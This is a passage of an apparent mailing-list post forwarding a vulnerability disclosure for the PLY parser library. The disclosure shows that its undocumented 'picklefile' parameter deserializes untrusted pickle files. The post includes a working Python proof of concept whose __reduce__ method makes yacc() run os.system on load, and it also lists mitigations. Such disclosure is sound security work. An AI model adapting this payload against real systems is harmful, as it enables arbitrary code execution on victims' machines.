> * Loaded from configurable or writable paths
> 
> Given the lack of documentation, silent execution path, and the high impact
> of unsafe deserialization, a CVE assignment is warranted to raise awareness
> and protect downstream users.
> 
> ---
> 
> ## Proof of Concept (PoC)
> 
> This proof of concept demonstrates arbitrary code execution when a
> malicious pickle file is supplied via the undocumented `picklefile` parameter.
> 
> ### PoC Overview
> 
> The PoC:
> 
> * Defines a minimal lexer and parser
> * Crafts a malicious pickle payload
> * Executes a system command during deserialization
> 
> ### Expected Result
> 
> When `yacc(picklefile='exploit.pkl')` is invoked, arbitrary code is executed
> during parser initialization.
> 
> ```python
> import pickle
> import os
> from ply.lex import lex
> from ply.yacc import yacc
> 
> tokens = ('EXAMPLE',)
> 
> def t_EXAMPLE(t):
>     r'example'
>     return t
> 
> def p_sample(p):
>     'sample : EXAMPLE'
>     pass
> 
> class Exploit:
>     def __reduce__(self):
>         cmd = 'touch /tmp/pwned && echo "VULNERABLE" > /tmp/pwned'
>         return (os.system, (cmd,))
> 
> malicious_data = {
>     '_tabversion': '3.11',
>     '_lr_action': {0: {}},
>     '_lr_goto': {0: {}},
>     '_lr_productions': [
>         (None, 0, 0, 0, Exploit())
>     ],
>     '_lr_method': 'LALR'
> }
> 
> with open('exploit.pkl', 'wb') as f:
>     pickle.dump(malicious_data, f)
> 
> parser = yacc(picklefile='exploit.pkl', debug=False, write_tables=False)
> parser.parse('example')
> ```
> 
> ---
> 
> ## Mitigation
> 
> * Do *not* use the `picklefile` parameter with untrusted or externally
>   writable files
> * Avoid loading parser tables from user‑controlled locations
> * Treat all pickle files as *unsafe input*
> * Prefer regenerating parser tables rather than loading them from disk
> 
> ---
> 
> 
> ## References
> 
> * PLY GitHub Repository: https://github.com/dabeaz/ply
> * PyPI Package: https://pypi.org/project/ply/
> * Python Pickle Documentation: https://docs.python.org/3/library/pickle.html
> * Proof of Concept Repository:
>   https://github.com/bohmiiidd/Undocumented-RCE-in-PLY

Of note, https://github.com/dabeaz/ply now bears a banner:
"This repository was archived by the owner on Dec 21, 2025. It is now read-only."

-- 
         -Alan Coopersmith-                 alan.coopersmith@oracle.com
          Oracle Solaris Engineering - https://blogs.oracle.com/solaris

